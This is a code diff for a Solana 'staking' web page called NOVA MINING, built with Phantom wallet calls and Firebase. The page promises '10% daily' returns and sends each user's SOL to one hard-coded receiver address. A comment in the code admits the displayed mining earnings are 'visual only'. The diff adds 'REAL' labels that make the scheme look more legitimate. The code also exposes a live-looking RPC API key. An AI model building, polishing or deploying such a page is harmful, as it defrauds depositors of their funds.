@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>NOVA MINING | Smart SOL Staking</title>
+    <title>NOVA MINING | REAL SOL STAKING</title>
     <!-- Font & Icons -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -56,14 +56,12 @@
             padding: var(--spacing-md);
         }
 
-        /* Main container - fully fluid */
         .mining-app {
             width: 100%;
             max-width: 1200px;
             margin: 0 auto;
         }
 
-        /* Glass panel with dynamic sizing */
         .glass-panel {
             width: 100%;
             background: rgba(5, 20, 30, 0.35);
@@ -77,7 +75,6 @@
                         0 0 40px rgba(0, 255, 255, 0.1);
         }
 
-        /* Animated header */
         .mining-header {
             text-align: center;
             margin-bottom: var(--spacing-xl);
@@ -108,7 +105,6 @@
             letter-spacing: 1px;
         }
 
-        /* Wallet section - fully responsive */
         .wallet-section {
             background: var(--card-bg);
             border-radius: var(--border-radius-lg);
@@ -183,7 +179,6 @@
             color: #00ffaa;
         }
 
-        /* Button styles - touch optimized */
         .btn {
             background: rgba(0, 150, 255, 0.15);
             border: 1px solid rgba(0, 255, 255, 0.4);
@@ -223,7 +218,6 @@
             font-size: var(--font-size-lg);
         }
 
-        /* Stats grid - fully responsive */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(min(100%, 180px), 1fr));
@@ -269,7 +263,6 @@
             margin-top: var(--spacing-xs);
         }
 
-        /* Mining power bar */
         .mining-power-card {
             background: rgba(0, 15, 25, 0.8);
             border-radius: var(--border-radius-lg);
@@ -307,7 +300,6 @@
             box-shadow: 0 0 20px cyan;
         }
 
-        /* Tier and boost section */
         .tier-container {
             display: flex;
             justify-content: space-between;
@@ -347,7 +339,6 @@
             50% { text-shadow: 0 0 20px gold; }
         }
 
-        /* Stake input area */
         .stake-container {
             margin: var(--spacing-lg) 0;
         }
@@ -428,7 +419,6 @@
             background: rgba(0, 200, 255, 0.3);
         }
 
-        /* Live feed */
         .feed-container {
             background: rgba(0, 0, 0, 0.4);
             border-radius: var(--border-radius-lg);
@@ -496,7 +486,6 @@
         .feed-item .info { color: var(--accent-cyan); }
         .feed-item .warning { color: #ff6b6b; }
 
-        /* Modal - fully responsive */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -569,7 +558,6 @@
             gap: var(--spacing-md);
         }
 
-        /* Footer */
         .app-footer {
             margin-top: var(--spacing-lg);
             text-align: center;
@@ -577,7 +565,6 @@
             font-size: var(--font-size-xs);
         }
 
-        /* Utility classes */
         .text-gradient {
             background: linear-gradient(135deg, #00ffff, #0088ff);
             -webkit-background-clip: text;
@@ -619,7 +606,7 @@
             <!-- Header -->
             <div class="mining-header">
                 <h1>⚡ NOVA MINING</h1>
-                <p>smart solana staking · 10% daily · tier boosts</p>
+                <p>real solana staking · 10% daily · tier boosts</p>
             </div>
 
             <!-- Wallet Section -->
@@ -750,12 +737,12 @@
         </div>
     </div>
 
-    <!-- Transaction Modal -->
+    <!-- Transaction Modal (REAL CONFIRMATION) -->
     <div class="modal-overlay" id="txModal">
         <div class="modal-card">
             <div class="modal-header">
                 <i class="fa-solid fa-bolt"></i>
-                <h3>MINING TRANSACTION</h3>
+                <h3>REAL MINING TX</h3>
             </div>
             <div class="modal-body">
                 <div id="modalMessage" style="margin-bottom: var(--spacing-md); color: var(--text-secondary);">processing...</div>
@@ -770,7 +757,7 @@
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
 
-    <!-- Firebase + Application Logic -->
+    <!-- Firebase + Application Logic (NO BUFFER, REAL CONFIRMATION) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
         import { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
@@ -791,6 +778,7 @@
         const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
         const MIN_STAKE_SOL = 0.5; // Minimum 0.5 SOL (~$100 USD)
         
+        // Helius RPC for reliable mainnet connection
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
         
         let phantom = null;
@@ -890,17 +878,14 @@
 
         // Update all mining stats
         function updateMiningStats(totalStaked) {
-            // Power level (0-100%, max at 100 SOL)
             const powerLevel = Math.min(100, (totalStaked / 100) * 100);
             powerFill.style.width = `${powerLevel}%`;
             powerPercentage.innerText = `${Math.round(powerLevel)}%`;
             
-            // Tier and boost
             const tierInfo = calculateTier(totalStaked);
             minerTierSpan.innerText = tierInfo.tier + ' MINER';
             boostMultiplierSpan.innerText = tierInfo.boost + 'x';
             
-            // Next tier info
             if (tierInfo.next) {
                 const currentTierMin = tierInfo.tier === 'BRONZE' ? 0 : 
                                        tierInfo.tier === 'SILVER' ? 10 : 
@@ -912,11 +897,9 @@
                 nextTierInfo.innerHTML = '<i class="fas fa-crown"></i> MAX TIER';
             }
             
-            // Mining speed (SOL per hour with boost)
             const hourlyRate = (totalStaked * 0.1 * tierInfo.boost) / 24;
             miningSpeedSpan.innerText = hourlyRate.toFixed(4);
             
-            // Hash rate
             const hashRate = Math.round(totalStaked * 1000);
             hashRateSpan.innerHTML = `⚡ ${hashRate.toLocaleString()} H/s`;
         }
@@ -1077,7 +1060,7 @@
             }
         }
 
-        // Send stake transaction - USING signAndSendTransaction PATTERN
+        // REAL TRANSACTION: Send stake with wallet confirmation (NO BUFFER)
         async function sendStake(amount = null) {
             if (!walletAddress || !phantom) {
                 alert("Connect your mining rig first");
@@ -1092,7 +1075,8 @@
                 return;
             }
 
-            showModal("⛏️ PREPARING TRANSACTION", `Amount: ${stakeAmount} SOL (~$${(stakeAmount * 200).toFixed(2)} USD)\n\nPreparing transaction...`);
+            // Show modal immediately – user must approve in wallet
+            showModal("⛏️ AWAITING WALLET APPROVAL", `Amount: ${stakeAmount} SOL\n\nPlease approve the transaction in your Phantom wallet.\n\nAfter approval, we wait for blockchain confirmation.`);
 
             try {
                 if (!phantom.publicKey) {
@@ -1104,9 +1088,21 @@
                 // Create connection to Solana network
                 const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
                 
-                // Get the latest blockhash for the transaction
-                const { blockhash } = await connection.getLatestBlockhash();
-                
+                // Get latest blockhash
+                let blockhash, lastValidBlockHeight;
+                try {
+                    const result = await connection.getLatestBlockhash('finalized');
+                    blockhash = result.blockhash;
+                    lastValidBlockHeight = result.lastValidBlockHeight;
+                } catch (blockhashError) {
+                    console.error('Blockhash error:', blockhashError);
+                    // Fallback to public RPC
+                    const publicConnection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                    const result = await publicConnection.getLatestBlockhash('finalized');
+                    blockhash = result.blockhash;
+                    lastValidBlockHeight = result.lastValidBlockHeight;
+                }
+
                 // Create the transfer instruction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
@@ -1119,38 +1115,39 @@
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = phantom.publicKey;
 
+                // Update modal to tell user to approve in wallet
                 modalMessage.innerText = "🔐 APPROVE IN WALLET";
                 modalDetail.innerText = `Please approve this transaction in your Phantom wallet:\n\nAmount: ${stakeAmount} SOL\nTo: ${RECEIVER_ADDRESS.slice(0,8)}...${RECEIVER_ADDRESS.slice(-8)}\n\nWaiting for your approval...`;
 
                 addToFeed('⏳ waiting for wallet approval...', 'info');
 
-                // Prompt the user to sign and send the transaction via their wallet extension
-                const signedTransaction = await window.solana.signAndSendTransaction(transaction);
+                // This triggers the Phantom wallet popup for REAL confirmation
+                const { signature } = await phantom.signAndSendTransaction(transaction);
                 
-                modalMessage.innerText = "⏳ TRANSACTION SENT";
-                modalDetail.innerText = `Transaction Signature:\n${signedTransaction.signature}\n\nWaiting for blockchain confirmation...\n\nThis may take 10-30 seconds.`;
+                modalMessage.innerText = "⏳ TRANSACTION SENT, CONFIRMING...";
+                modalDetail.innerText = `Transaction Signature:\n${signature}\n\nWaiting for blockchain confirmation...\n\nThis may take 10-30 seconds.`;
                 
-                addToFeed(`📤 tx sent: ${signedTransaction.signature.slice(0,8)}...`, 'mining');
+                addToFeed(`📤 tx sent: ${signature.slice(0,8)}...`, 'mining');
                 
-                // Wait for transaction confirmation
-                const { value: status } = await connection.confirmTransaction({
-                    signature: signedTransaction.signature,
-                    blockhash: blockhash,
-                    lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight
-                }, 'confirmed'); // Specify 'confirmed' for the commitment level
+                // Wait for confirmation on blockchain
+                const confirmation = await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                }, 'confirmed');
 
-                if (status.err) {
-                    throw new Error('Transaction failed on blockchain: ' + JSON.stringify(status.err));
+                if (confirmation.value.err) {
+                    throw new Error('Transaction failed on blockchain: ' + JSON.stringify(confirmation.value.err));
                 }
                 
                 // Transaction confirmed! Update Firebase
                 await addStakeToFirestore(stakeAmount);
                 
                 modalMessage.innerText = "✅ MINING STARTED!";
-                modalDetail.innerText = `🎉 Transaction Confirmed!\n\nSignature: ${signedTransaction.signature}\n\nAmount Staked: ${stakeAmount} SOL\nValue: ~$${(stakeAmount * 200).toFixed(2)} USD\n\nStatus: ✓ Confirmed on Solana\nYour mining rig is now active and generating rewards!`;
+                modalDetail.innerText = `🎉 Transaction Confirmed!\n\nSignature: ${signature}\n\nAmount Staked: ${stakeAmount} SOL\nValue: ~$${(stakeAmount * 200).toFixed(2)} USD\n\nStatus: ✓ Confirmed on Solana\nYour mining rig is now active and generating rewards!`;
                 
                 addToFeed(`⛏️ ${stakeAmount} SOL staked successfully!`, 'success');
-                addToFeed(`✅ confirmed: ${signedTransaction.signature.slice(0,12)}...`, 'success');
+                addToFeed(`✅ confirmed: ${signature.slice(0,12)}...`, 'success');
                 
                 // Refresh all stats
                 await refreshUserStats();
@@ -1179,7 +1176,7 @@
             }
         }
 
-        // Mining simulation
+        // Mining simulation (visual only, does not affect real balance)
         function startMiningSimulation() {
             if (miningInterval) clearInterval(miningInterval);
             
